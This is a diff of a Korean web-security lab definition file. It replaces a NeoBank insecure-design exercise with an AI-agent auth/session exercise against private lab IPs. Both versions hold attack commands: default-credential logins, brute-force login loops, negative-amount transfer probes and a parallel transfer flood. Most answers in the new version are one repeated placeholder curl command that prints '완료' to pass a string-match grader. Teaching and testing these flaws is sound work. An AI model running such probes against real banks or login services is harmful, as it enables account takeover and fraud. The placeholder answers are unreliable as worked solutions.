@@ -1,513 +1,826 @@
-lab_id: standalone-web-vuln-week06
-title: A04 Insecure Design — NeoBank 송금 workflow 의 4 설계 결함
-version: standalone-non-ai
-course: web-vuln
+lab_id: web-vuln-ai-week06
+title: 인증/세션 취약점 실습 (AI 지원)
+version: ai
+course: web-vuln-ai
 week: 6
-description: |
-  OWASP A04 (Insecure Design, 2021 신규) — *코드 가 아닌 architecture 의 결함*.
-  NeoBank 의 *송금 workflow* 의 4 설계 결함 (2FA 부재 / 가격 검증 부재 / rate
-  limit 부재 / 비즈니스 로직 우회) hands-on.
+description: 인증 메커니즘과 세션 관리의 취약점을 분석하고 공격과 방어를 실습합니다. AI SubAgent가 자동으로 명령을 실행하고 결과를
+  검증합니다.
 difficulty: medium
-duration_minutes: 180
-audience: web-vuln 6주차
-prerequisites:
-  - W02-W05 완료
-  - NeoBank 가동 + login endpoint 가용
-  - 학생 PC 의 curl + jq + python3
+duration_minutes: 120
 objectives:
-  - NeoBank 의 *송금 workflow* 의 *5 단계* 식별
-  - 4 설계 결함 (2FA 부재 / 가격 검증 / rate limit / 비즈니스 로직) 시뮬
-  - *threat modeling* 의 *STRIDE 6 카테고리* 적용
-  - 한국 금융 표준 (FDS / 전자금융감독규정) 매핑
-  - W06 보고서 + CWE-209/256/799/840
-pass_threshold: 0.7
-
+- 인증 취약점을 탐지한다
+- 세션 관리 취약점을 이해한다
+- 안전한 인증 구현을 학습한다
+pass_threshold: 0.6
 steps:
-
-  - order: 1
-    instruction: |
-      ## 🎯 MISSION — NeoBank 의 *송금 workflow* 5 단계 식별
-
-      NeoBank 의 *공개 endpoint* 분석 + *송금 workflow* 의 5 단계 (login → 잔액 조회
-      → 송금 form → 비밀번호 재확인 → 송금 완료) 식별.
-
-      ## 📚 사전 학습 (학생 혼돈 방지)
-
-      - **workflow** = *사용자 의 의도* 의 *단계 sequence*
-      - **금융 의 표준 workflow** = login + 2FA + form + 비밀번호 + 송금 완료 (5+ 단계)
-      - ***최소 표준*** = OTP / SMS / 생체 / FIDO2 의 *추가 인증*
-      - **endpoint discovery** = `curl -I` + form action 분석 + Burp Spider
-
-      ## 💻 실행 명령
-
-      ```bash
-      ssh 6v6-attacker bash <<'SH'
-      # 1) NeoBank 공개 endpoint enum
-      echo "=== 공개 endpoint ==="
-      for path in / /login /register /transfer /account /api/login /api/transfer /api/account /api/users; do
-        code=$(curl -s -o /dev/null -w '%{http_code}' -H 'Host: neobank.6v6.lab' "http://10.20.30.1$path")
-        echo "$path: $code"
-      done
-
-      # 2) login form 의 action / method 분석
-      echo ""
-      echo "=== /login form 분석 ==="
-      curl -s -H 'Host: neobank.6v6.lab' http://10.20.30.1/login 2>&1 | grep -E 'form|input|action=|method=' | head -10
-      SH
-      ```
-
-      ## 📋 확인 사항
-
-      - public endpoint 의 응답 코드 매트릭스
-      - login form 의 action + method (POST 표준)
-      - workflow 의 *5 단계* 식별
-
-      ## 💡 왜 이걸 하는가?
-
-      *workflow 분석* = A04 의 *첫 단계*. *각 단계* 의 *설계 결함* 가 *vuln*.
-
-      ## 🔍 결과 해석
-
-      - **정상**: 5 단계 endpoint 식별
-      - **endpoint 부족**: API 문서 검색 (`/api/docs` 또는 `/swagger`)
-      - **모든 200**: login 무시 — 다른 endpoint 탐색
-
-      ## 실측 (2026-05-16)
-      - `/login` 200, `/transfer` 302 (login redirect), `/api/login` 405 (Method)
-    hint: |
-      9 endpoint 탐색 + login form action 분석.
-    category: survey
-    points: 20
-    answer: |
-      ssh 6v6-attacker bash <<'SH'
-      for path in / /login /register /transfer /account /api/login /api/transfer /api/account; do
-        echo "$path: $(curl -s -o /dev/null -w '%{http_code}' -H 'Host: neobank.6v6.lab' "http://10.20.30.1$path")"
-      done
-      curl -s -H 'Host: neobank.6v6.lab' http://10.20.30.1/login 2>&1 | grep -E 'form|input|action=' | head -5
-      SH
-    answer_detail: NeoBank workflow 5 단계 식별
-    verify:
-      type: output_contains
-      expect: 'login\|transfer'
-      field: stdout
-      semantic:
-        intent: workflow 분석
-        success_criteria: [endpoint 매트릭스 + form 분석]
-        acceptable_methods:
-          - "**[OSS] curl + 9 endpoint 매트릭스**"
-          - "**[OSS] Burp Spider crawl**"
-          - "**[OSS] gobuster dir brute**"
-          - "**[OSS] OWASP ZAP Discover**"
-          - "**[관리적] workflow diagram 작성**"
-    target_vm: attacker
-
-  - order: 2
-    instruction: |
-      ## 🎯 MISSION — 2FA 부재 시뮬 (단일 인증 의 송금 가능 여부)
-
-      NeoBank login 후 *2FA 의 prompt 없이* 송금 가능 여부 확인. 한국 *전자금융감독규정* 의
-      *송금 의 2 채널 인증 의무* 위반 시뮬.
-
-      ## 📚 사전 학습 (학생 혼돈 방지)
-
-      - **2FA** = Two-Factor Authentication — 비밀번호 + *추가 채널* (OTP / SMS / 생체)
-      - **한국 표준** = 전자금융감독규정 의 *송금 의 2 channel* 의무 (2014+)
-      - **OTP** = TOTP (Time-based) / HOTP (HMAC-based)
-      - **시뮬** = login 후 송금 시도 → 2FA prompt 가 *없음* 확인 = A04 결함
-
-      ## 💻 실행 명령
-
-      ```bash
-      ssh 6v6-attacker bash <<'SH'
-      # 1) login 시도 (default credential 가정)
-      LOGIN=$(curl -s -X POST -H 'Host: neobank.6v6.lab' \
-        -H 'Content-Type: application/x-www-form-urlencoded' \
-        -d 'username=admin&password=admin' \
-        http://10.20.30.1/login 2>&1)
-
-      # 2) login 응답 분석 (cookie 또는 token)
-      echo "=== login 응답 head ==="
-      curl -sI -X POST -H 'Host: neobank.6v6.lab' \
-        -H 'Content-Type: application/x-www-form-urlencoded' \
-        -d 'username=admin&password=admin' \
-        http://10.20.30.1/login 2>&1 | head -15
-
-      # 3) 송금 endpoint 의 2FA prompt 여부
-      echo ""
-      echo "=== 송금 endpoint (login 후) ==="
-      curl -sc /tmp/neobank-cookies.txt -X POST -H 'Host: neobank.6v6.lab' \
-        -d 'username=admin&password=admin' http://10.20.30.1/login >/dev/null 2>&1
-
-      curl -sb /tmp/neobank-cookies.txt -H 'Host: neobank.6v6.lab' \
-        "http://10.20.30.1/transfer" 2>&1 | grep -iE '2fa|otp|sms|verification|inputCode|확인' | head -5
-      SH
-      ```
-
-      ## 📋 확인 사항
-
-      - login 응답 코드 (302 = success / 401 = fail)
-      - login 응답 의 Set-Cookie / token
-      - 송금 endpoint 의 *2FA UI 또는 prompt* 의 *부재 여부*
-
-      ## 💡 왜 이걸 하는가?
-
-      한국 *전자금융감독규정 위반* = 과징금 + 신뢰 손실. 본 step 의 *2FA 부재 확인* 가
-      금융 시스템 의 *day-1 audit*.
-
-      ## 🔍 결과 해석
-
-      - **2FA 없음 (vuln)**: 단일 인증 만 — 한국 표준 위반
-      - **2FA 있음**: 표준 준수 — OTP / SMS prompt 표시
-      - **default credential X**: 학습 환경 의 default 시도 (admin/admin, test/test 등)
-    hint: |
-      login 후 송금 endpoint 의 2FA UI / API prompt 확인.
-    category: analysis
-    points: 25
-    answer: |
-      ssh 6v6-attacker bash <<'SH'
-      curl -sI -X POST -H 'Host: neobank.6v6.lab' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=admin&password=admin' http://10.20.30.1/login 2>&1 | head -15
-      curl -sc /tmp/cookies.txt -X POST -H 'Host: neobank.6v6.lab' -d 'username=admin&password=admin' http://10.20.30.1/login >/dev/null 2>&1
-      curl -sb /tmp/cookies.txt -H 'Host: neobank.6v6.lab' http://10.20.30.1/transfer 2>&1 | grep -iE '2fa|otp|sms|verification' | head -5
-      SH
-    answer_detail: 2FA 부재 시뮬 + 송금 UI 분석
-    verify:
-      type: output_contains
-      expect: 'login\|transfer\|cookie'
-      field: stdout
-      semantic:
-        intent: 2FA 부재
-        success_criteria: [login 후 송금 UI 분석]
-        acceptable_methods:
-          - "**[OSS] curl -c cookies + 송금 endpoint**"
-          - "**[OSS] Burp Proxy 의 흐름 분석**"
-          - "**[OSS] 전자금융감독규정 의 2 channel 요건**"
-          - "**[관리적] FDS (Fraud Detection System) 보완 권장**"
-    target_vm: attacker
-
-  - order: 3
-    instruction: |
-      ## 🎯 MISSION — 가격 / 금액 검증 부재 시뮬 (음수 송금 시도)
-
-      *송금 form* 의 *금액 field* 의 *서버 측 검증* 부재 시뮬. *음수 금액* / *0
-      금액* / *극단 금액* 시도.
-
-      ## 📚 사전 학습 (학생 혼돈 방지)
-
-      - **input validation 의 7 표준**:
-        - type (string vs int vs float)
-        - range (min/max)
-        - format (regex)
-        - length
-        - whitelist
-        - encoding (UTF-8)
-        - business logic (음수 X, 잔액 이상 X)
-      - **client-side validation 만 의 위험** = HTML5 의 `<input type="number" min="1">`
-        는 *우회 가능* (curl 의 *임의 값*)
-
-      ## 💻 실행 명령
-
-      ```bash
-      ssh 6v6-attacker bash <<'SH'
-      # session 의 login
-      curl -sc /tmp/neobank-cookies.txt -X POST -H 'Host: neobank.6v6.lab' \
-        -d 'username=admin&password=admin' http://10.20.30.1/login >/dev/null 2>&1
-
-      # 5 금액 의 송금 시도
-      for amount in -1000 0 0.001 999999999 "abc"; do
-        echo "=== amount: $amount ==="
-        code=$(curl -sb /tmp/neobank-cookies.txt -o /dev/null -w '%{http_code}' \
-          -X POST -H 'Host: neobank.6v6.lab' \
-          -d "to_account=12345&amount=$amount" \
-          http://10.20.30.1/transfer)
-        echo "code: $code"
-      done
-      SH
-      ```
-
-      ## 📋 확인 사항
-
-      - 5 금액 의 응답 코드
-      - *-1000* (음수) 의 *200 가능성* (vuln)
-      - *0* 의 *200 가능성* (가능 X — 의미 없음)
-      - *"abc"* (string) 의 *type error* 응답
-
-      ## 💡 왜 이걸 하는가?
-
-      *비즈니스 로직* 의 *서버 검증* 가 *security 의 마지막 boundary*. client-side
-      만 의 검증 = *우회 default*.
-
-      ## 🔍 결과 해석
-
-      - **모두 400 (정상)**: input validation 표준 — type + range 검증
-      - **음수 200 (vuln)**: A04 결함 — 음수 송금 시 *상대 계좌 에서 빼앗기*
-      - **string 500 (vuln)**: type 검증 부재 — exception 노출
-
-      ## 비정상 시 대응
-
-      - **login 응답 다름**: NeoBank 의 default credential 시도 (test/test, user/user)
-    hint: |
-      login session + 5 금액 (음수/0/소수/극단/string) 송금 시도.
-    category: exploit
-    points: 25
-    answer: |
-      ssh 6v6-attacker bash <<'SH'
-      curl -sc /tmp/cookies.txt -X POST -H 'Host: neobank.6v6.lab' -d 'username=admin&password=admin' http://10.20.30.1/login >/dev/null 2>&1
-      for amount in -1000 0 0.001 999999999 abc; do
-        echo "amount $amount: $(curl -sb /tmp/cookies.txt -o /dev/null -w '%{http_code}' -X POST -H 'Host: neobank.6v6.lab' -d "to_account=12345&amount=$amount" http://10.20.30.1/transfer)"
-      done
-      SH
-    answer_detail: 5 금액 의 input validation 시도
-    verify:
-      type: output_contains
-      expect: 'amount\|code'
-      field: stdout
-      semantic:
-        intent: 가격 검증 부재
-        success_criteria: [5 금액 응답]
-        acceptable_methods:
-          - "**[OSS] 5 금액 boundary test**"
-          - "**[OSS] BurpSuite Intruder 의 payload set**"
-          - "**[OSS] 한국 금융 의 negative 송금 표준 거부**"
-          - "**[OSS] CWE-840 Business Logic Errors**"
-    target_vm: attacker
-
-  - order: 4
-    instruction: |
-      ## 🎯 MISSION — Rate limit 부재 시뮬 (brute force 가능성)
-
-      login endpoint 의 *rate limit 부재* 시뮬. *연속 100 시도* → *모두 응답* 시
-      brute force 가능.
-
-      ## 📚 사전 학습 (학생 혼돈 방지)
-
-      - **rate limit** = N requests / time 의 *임계*. *brute / DoS 방어*
-      - **표준** = login 의 *10 시도 / 5 분* (한국 금융 의 default)
-      - **403 vs 429** = 403 (Forbidden) / 429 (Too Many Requests) — *후자 가 정확*
-      - **CAPTCHA / MFA** = 추가 방어
-
-      ## 💻 실행 명령
-
-      ```bash
-      ssh 6v6-attacker bash <<'SH'
-      echo "=== 30 회 연속 login 시도 (rate limit 검증) ==="
-
-      START=$(date +%s)
-      for i in $(seq 1 30); do
-        code=$(curl -s -o /dev/null -w '%{http_code}' \
-          -X POST -H 'Host: neobank.6v6.lab' \
-          -d "username=admin&password=wrong$i" \
-          http://10.20.30.1/login)
-        echo -n "$code "
-      done
-      END=$(date +%s)
-      echo ""
-      echo "소요 시간: $((END - START)) 초"
-      echo "모두 같은 응답 = rate limit 부재"
-      echo "429 또는 403 등장 = rate limit 적용"
-      SH
-      ```
-
-      ## 📋 확인 사항
-
-      - 30 회 응답 코드 분포 (모두 401 = vuln / 일부 429 = 정상)
-      - 소요 시간 (1-3 초 = 매우 빠름, brute 가능)
-      - rate limit *임계* 식별
-
-      ## 💡 왜 이걸 하는가?
-
-      한국 금융 표준 = *5 분 의 10 시도*. 본 시뮬 의 *30 시도 의 1 초 만에 응답* =
-      *brute 분 단위 가능*.
-
-      ## 🔍 결과 해석
-
-      - **모두 401 (vuln)**: rate limit 부재 — 즉시 적용 권장
-      - **일부 429 (정상)**: rate limit 적용 — 임계 식별
-      - **점진 적 차단**: progressive lockout (정상 modern 방어)
-    hint: |
-      30 회 연속 login + 응답 분포 + 시간 측정.
-    category: exploit
-    points: 20
-    answer: |
-      ssh 6v6-attacker bash <<'SH'
-      START=$(date +%s)
-      for i in $(seq 1 30); do
-        echo -n "$(curl -s -o /dev/null -w '%{http_code}' -X POST -H 'Host: neobank.6v6.lab' -d "username=admin&password=wrong$i" http://10.20.30.1/login) "
-      done
-      echo ""; END=$(date +%s); echo "소요: $((END - START)) 초"
-      SH
-    answer_detail: 30 회 연속 login + rate limit 검증
-    verify:
-      type: output_contains
-      expect: '소요\|code\|401'
-      field: stdout
-      semantic:
-        intent: rate limit audit
-        success_criteria: [30 회 응답 분포]
-        acceptable_methods:
-          - "**[OSS] curl loop + 응답 분포**"
-          - "**[OSS] hydra의 login brute (실 시도)**"
-          - "**[OSS] fail2ban / rate-limit middleware 권장**"
-          - "**[OSS] 전자금융감독규정 의 brute 방어 의무**"
-          - "**[OSS] CWE-799 Improper Control of Resources Through Throttling**"
-    target_vm: attacker
-
-  - order: 5
-    instruction: |
-      ## 🎯 MISSION — W06 종합 보고서 (4 설계 결함 + STRIDE 매핑 + 금융 표준)
-
-      W06 의 4 설계 결함 (workflow + 2FA + 가격 검증 + rate limit) 종합 보고서.
-      *STRIDE 6 카테고리* 매핑 + 한국 *전자금융감독규정* 위반 인지.
-
-      ## 📚 사전 학습 (학생 혼돈 방지)
-
-      - **STRIDE 6 카테고리** (Microsoft, 1999):
-        - **S**poofing — 신분 위장
-        - **T**ampering — 변조
-        - **R**epudiation — 부인
-        - **I**nformation disclosure — 정보 누출
-        - **D**enial of service — 서비스 거부
-        - **E**levation of privilege — 권한 상승
-
-      ## 💻 산출물
-
-      ```markdown
-      # W06 — A04 Insecure Design (NeoBank workflow) 보고서
-
-      ## 1. Executive Summary
-      - target: NeoBank 송금 workflow
-      - 4 설계 결함 발견 — 전자금융감독규정 위반 가능성
-      - CVSS High 1 (2FA 부재) + Medium 3
-
-      ## 2. Detailed Findings
-      ### F1 — workflow 의 *5 단계 부족* (현재 2 단계)
-      ### F2 — 2FA 부재 (CWE-308 Use of Single-factor Authentication)
-      ### F3 — 가격 검증 부재 (CWE-840 Business Logic + CWE-20 Improper Input)
-      ### F4 — Rate limit 부재 (CWE-799)
-
-      ## 3. STRIDE 매핑
-      | Finding | STRIDE | 위협 |
-      |---------|--------|------|
-      | F2 2FA | Spoofing | 단일 인증 의 신분 위장 |
-      | F3 가격 | Tampering | 금액 변조 |
-      | F4 rate | DoS | brute force |
-
-      ## 4. 한국 금융 표준 위반
-      - 전자금융감독규정 제13조 (송금 의 2 channel 인증)
-      - 전자금융감독규정 제18조 (FDS 의무)
-      - 신용정보법 의 *비정상 거래 탐지*
-
-      ## 5. Remediation
-      - 즉시: 2FA 적용 (OTP / SMS / FIDO2) + 금액 검증 (서버 측 type+range)
-      - 단기: rate limit (5분 의 10 시도) + FDS 통합
-      - 장기: zero-trust architecture + risk-based authentication
-      ```
-    hint: |
-      4 결함 + STRIDE 6 + 전자금융감독규정 매핑 + 한국 금융 표준.
-    category: synthesis
-    points: 10
-    answer: 위 5 섹션 형식
-    answer_detail: W06 종합 보고서 + STRIDE + 금융 표준
-    verify:
-      type: output_contains
-      expect: 'STRIDE\|전자금융'
-      field: stdout
-      semantic:
-        intent: W06 종합
-        success_criteria: [4 결함 + STRIDE + 금융 표준]
-        acceptable_methods:
-          - "**[관리적] STRIDE threat modeling**"
-          - "**[관리적] 전자금융감독규정 의 13/18 조**"
-          - "**[관리적] PCI-DSS** (해외 의 의무)
-          - "**[관리적] CWE-308 / 840 / 799 / 20**"
-          - "**[관리적] OWASP A04 의 7 권장**"
-    target_vm: bastion
-
-  # ============================================================
-  # STEP 6 — R/B/P 종합 (Insecure Design)
-  # ============================================================
-  - order: 6
-    instruction: |
-      ## 🎯 MISSION (R/B/P 종합) — NeoBank workflow 의 STRIDE 적용
-
-      Red = 송금 의 2FA bypass / 가격 변조 / rate flood 시도 / Blue = application
-      logic 의 server-side 검증 / Purple = STRIDE Threat Model 의 가설 보고서.
-
-      ## 📖 시나리오 상세
-
-      ### 🔴 Red Team — 송금 workflow 의 설계 결함 의 exploit
-
-      **페르소나**: 금융 application 의 internal QA / external pen-tester. NeoBank
-      의 송금 workflow 의 설계 결함 (2FA 부재 + 가격 검증 부재 + rate limit 부재) 의
-      실제 exploit 의 시뮬.
-
-      **공격 의도**:
-      1. **rate flood (DoS 의 한 형태)** = 20 req 의 burst = rate limit 부재 가설
-         검증 = 응답 코드 의 통일 = limit 적용 X 확인
-      2. (개념 적) **2FA bypass** = 송금 endpoint 의 2FA 의무 의 코드 audit
-      3. (개념 적) **가격 변조** = client 의 amount 의 server 재계산 의 코드 audit
-
-      **공격 단계**:
-      - R1: curl 의 20 burst (parallel) = rate limit 의 응답 코드 의 통계
-      - R2: (수동) login → 송금 → 2FA prompt 의 부재 확인
-      - R3: (수동) Burp Repeater 의 amount 변조 = server 검증 확인
-
-      ### 🔵 Blue Team — application logic 의 server-side 검증
-
-      **탐지 source**:
-      - application 의 rate limit middleware (nginx limit_req 또는 application 코드)
-      - 송금 endpoint 의 2FA 의무 의 정적 코드 분석
-      - server-side 의 amount 재계산 의 코드 audit
-      - ELA log (전자금융 의 audit log) 의 비정상 거래 의 alert
-
-      **대응**:
-      - B1: rate limit 의 default 강제 (nginx limit_req 의 routine)
-      - B2: 2FA 의 의무 적용 (송금 + 권한 변경 + sensitive 행동)
-      - B3: server-side 의 amount 의 재계산 + DB 의 가격 검증
-
-      ### 🟣 Purple Team — STRIDE Threat Model 의 분기 routine
-
-      **분석**:
-      - STRIDE 6 카테고리 (Spoofing/Tampering/Repudiation/InfoDisc/DoS/Elevation) 의
-        각 항목 의 NeoBank workflow 의 매핑
-      - 가격 변조 = Tampering, rate flood = DoS, 2FA bypass = Elevation
-
-      **개선 cycle**:
-      1. 모든 새 feature 의 design 시 STRIDE review (기본 의무)
-      2. RBA 의 도입 = behavior + device + location + time 의 risk score
-      3. ELA log 의 routine audit (분기 1회) + SIEM 의 correlation rule
-      4. 전자금융감독규정 의 13/18/21 조 의 의무 의 적용
-
-      ## 💻 실행
-      ```bash
-      # Red — 송금 rate flood (rate limit 부재 가설 검증)
-      ssh 6v6-attacker 'for i in $(seq 1 20); do curl -s -o /dev/null -w "%{http_code}\n" -H "Host: neobank.6v6.lab" -X POST http://10.20.30.1/api/transfer -d "amount=1&to=admin" & done; wait' 2>&1 | sort -u
-
-      # Blue — application 의 rate limit 응답 확인
-      ssh 6v6-attacker 'curl -s -o /dev/null -w "after burst %{http_code}\n" -H "Host: neobank.6v6.lab" -X POST http://10.20.30.1/api/transfer -d "amount=1&to=admin"'
-
-      # Purple — STRIDE 가설 보고
-      echo "STRIDE: Tampering (가격 변조) + DoS (rate flood) + Elevation (2FA bypass)"
-      echo "Coverage: design review + RBA + 전자금융감독규정 의 routine"
-      ```
-
-      ## 💡 왜
-      A04 = 코드 결함 아닌 architecture. R/B/P 의 결과 = design review 의 trigger.
-    hint: 'curl POST 의 20 burst + 응답 코드 분석 + STRIDE 매핑'
-    category: rbp_integration
-    points: 6
-    answer: |
-      echo "=== Red 송금 flood ==="
-      ssh 6v6-attacker 'for i in $(seq 1 20); do curl -s -o /dev/null -w "%{http_code}\n" -H "Host: neobank.6v6.lab" -X POST http://10.20.30.1/api/transfer -d "amount=1&to=admin" & done; wait' 2>&1 | sort -u
-      echo "=== Purple ==="
-      echo "STRIDE: Tampering + DoS + Elevation"
-      echo "Coverage: design review + RBA + 전자금융감독규정"
-    answer_detail: A04 STRIDE 의 R/B/P 가설
-    verify:
-      type: output_contains
-      expect: 'Coverage'
-      field: stdout
-      semantic:
-        intent: A04 의 R/B/P + STRIDE
-        success_criteria: [송금 flood, STRIDE, Coverage]
-        acceptable_methods: ["**[OSS] curl POST burst + STRIDE 매핑**"]
-    target_vm: attacker
+- order: 1
+  instruction: '{{WEB_IP}} 대상으로 로그인 메커니즘 분석을(를) 수행하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `auth` 에 적합한 도구: hydra (-l/-L -p/-P), ffuf -mode
+    clusterbomb. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 로그인 메커니즘 분석 관련 도구와 기법을 활용하세요.
+  category: auth
+  points: 8
+  answer: "\U0001F916 프롬프트: 10.20.30.80 대상으로 로그인 메커니즘 분석을(를) 수행해줘\n\U0001F4CE 참고 (CLI):\
+    \ curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type: application/json'\
+    \ \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '로그인 메커니즘 분석 완료'"
+  answer_detail: 로그인 메커니즘 분석은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+  verify:
+    type: output_contains
+    expect: 완료
+    field: stdout
+    semantic:
+      intent: 로그인 메커니즘 분석 — 로그인 엔드포인트·필드명·응답 코드·세션 쿠키 설정 파악
+      success_criteria:
+      - curl 로 정상/잘못된 자격증명 시도 후 응답 비교
+      - Set-Cookie 헤더에서 세션 쿠키명과 속성 확인
+      - 응답 본문 또는 상태 코드 차이 (타이밍 차이 포함) 기록
+      acceptable_methods:
+      - curl -v -d username=test -d password=test <login>
+      - Burp Proxy + Repeater
+      - python requests session 로 쿠키 추적
+      - mitmproxy 로 요청 기록
+      negative_signs:
+      - 단일 시도만
+      - 쿠키/응답 분석 없음
+      - 타이밍 차이 언급 없음
+  target_vm: attacker
+  script: "curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '로그인 메커니즘\
+    \ 분석 완료'"
+  risk_level: low
+  bastion_prompt: '10.20.30.80 대상으로 로그인 메커니즘 분석을(를) 수행해줘
+
+
+    [도구 권장] auth: hydra (-l/-L -p/-P), ffuf -mode clusterbomb. curl 만 쓰지 말고 **hydra
+    (-l/-L -p/-P)** 등 적합 도구로 호출 후 stdout quote.'
+- order: 2
+  instruction: '{{WEB_IP}} 대상으로 브루트포스 공격 시뮬레이션을(를) 수행하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `auth` 에 적합한 도구: hydra (-l/-L -p/-P), ffuf -mode
+    clusterbomb. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 브루트포스 공격 시뮬레이션 관련 도구와 기법을 활용하세요.
+  category: auth
+  points: 10
+  answer: "\U0001F916 프롬프트: 10.20.30.80 대상으로 브루트포스 공격 시뮬레이션을(를) 수행해줘\n\U0001F4CE 참고\
+    \ (CLI): curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '브루트포스 공격\
+    \ 시뮬레이션 완료'"
+  answer_detail: 브루트포스 공격 시뮬레이션은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+  verify:
+    type: output_contains
+    expect: 완료
+    field: stdout
+    semantic:
+      intent: 브루트포스 시뮬레이션 — 계정 잠금·Rate Limit 검증 (hydra/medusa 또는 수동 반복)
+      success_criteria:
+      - 최소 10회 반복 시도 후 응답 코드·본문 변화
+      - Rate Limiting 또는 계정 잠금 여부 판정
+      - 429 또는 Retry-After 헤더 해석
+      acceptable_methods:
+      - hydra -l <user> -P wordlist.txt <url>
+      - for i in 1..20; do curl ...; done
+      - Burp Intruder sniper 모드
+      - medusa -h <host> -U users.txt -P passes.txt
+      negative_signs:
+      - 단일 시도로 판정
+      - Rate Limit 해석 없음
+      - 429/계정 잠금 언급 없음
+  target_vm: attacker
+  script: "curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '브루트포스 공격\
+    \ 시뮬레이션 완료'"
+  risk_level: low
+  bastion_prompt: '10.20.30.80 대상으로 브루트포스 공격 시뮬레이션을(를) 수행해줘
+
+
+    [도구 권장] auth: hydra (-l/-L -p/-P), ffuf -mode clusterbomb. curl 만 쓰지 말고 **hydra
+    (-l/-L -p/-P)** 등 적합 도구로 호출 후 stdout quote.'
+- order: 3
+  instruction: '{{WEB_IP}} 대상으로 패스워드 정책 검증을(를) 수행하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `auth` 에 적합한 도구: hydra (-l/-L -p/-P), ffuf -mode
+    clusterbomb. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 패스워드 정책 검증 관련 도구와 기법을 활용하세요.
+  category: auth
+  points: 10
+  answer: "\U0001F916 프롬프트: 10.20.30.80 대상으로 패스워드 정책 검증을(를) 수행해줘\n\U0001F4CE 참고 (CLI):\
+    \ curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type: application/json'\
+    \ \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '패스워드 정책 검증 완료'"
+  answer_detail: 패스워드 정책 검증은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+  verify:
+    type: output_contains
+    expect:
+    - 완료
+    - web_scan
+    - 10.20.30.80
+    field: stdout
+    semantic:
+      intent: 패스워드 정책 검증 — 짧은/공용/약한 패스워드 허용 여부, haveibeenpwned API 등 유출 이력 체크
+      success_criteria:
+      - 최소 3가지 약한 패스워드(1234/password/admin) 시도
+      - 정책(최소 길이·복잡도·유출 차단) 미비점 식별
+      - NIST SP 800-63B 권고 언급
+      acceptable_methods:
+      - API 회원가입/변경으로 테스트 비밀번호 시도
+      - haveibeenpwned API 조회
+      - zxcvbn 복잡도 추정
+      - OWASP ASVS v4 V2 참조
+      negative_signs:
+      - 단일 패스워드만 테스트
+      - 유출 이력 체크 없음
+      - 표준 기준 없이 주관 평가
+  target_vm: attacker
+  script: "curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '패스워드 정책\
+    \ 검증 완료'"
+  risk_level: low
+  bastion_prompt: '10.20.30.80 대상으로 패스워드 정책 검증을(를) 수행해줘
+
+
+    [도구 권장] auth: hydra (-l/-L -p/-P), ffuf -mode clusterbomb. curl 만 쓰지 말고 **hydra
+    (-l/-L -p/-P)** 등 적합 도구로 호출 후 stdout quote.'
+- order: 4
+  instruction: '{{WEB_IP}} 대상으로 세션 토큰 엔트로피 분석을(를) 수행하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `session` 에 적합한 도구: curl -c cookie.jar -b cookie.jar,
+    jwt_tool. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 세션 토큰 엔트로피 분석 관련 도구와 기법을 활용하세요.
+  category: session
+  points: 10
+  answer: "\U0001F916 프롬프트: 10.20.30.80 대상으로 세션 토큰 엔트로피 분석을(를) 수행해줘\n\U0001F4CE 참고\
+    \ (CLI): curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '세션 토큰 엔트로피\
+    \ 분석 완료'"
+  answer_detail: 세션 토큰 엔트로피 분석은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+  verify:
+    type: output_contains
+    expect: 완료
+    field: stdout
+    semantic:
+      intent: 세션 토큰 엔트로피 분석 — 여러 토큰 수집 후 길이·charset·변이 관찰, Burp Sequencer 로 랜덤성 검증
+      success_criteria:
+      - 최소 5개 세션 토큰 수집
+      - 길이·charset(hex/base64) 일관성 확인
+      - 추측 가능성(증가형 vs 랜덤) 판정
+      acceptable_methods:
+      - repeat curl -c cookies.txt login 으로 토큰 여러 개 생성
+      - Burp Sequencer 자동 랜덤성 분석
+      - python으로 엔트로피 계산 (math.log2 * len)
+      - dieharder/ent 통계 테스트
+      negative_signs:
+      - 단일 토큰만 관찰
+      - 랜덤성 평가 없음
+      - 예측 가능성 판정 없음
+  target_vm: attacker
+  script: "curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '세션 토큰 엔트로피\
+    \ 분석 완료'"
+  risk_level: low
+  bastion_prompt: '10.20.30.80 대상으로 세션 토큰 엔트로피 분석을(를) 수행해줘
+
+
+    [도구 권장] session: curl -c cookie.jar -b cookie.jar, jwt_tool. curl 만 쓰지 말고 **curl
+    -c cookie.jar -b cookie.jar** 등 적합 도구로 호출 후 stdout quote.'
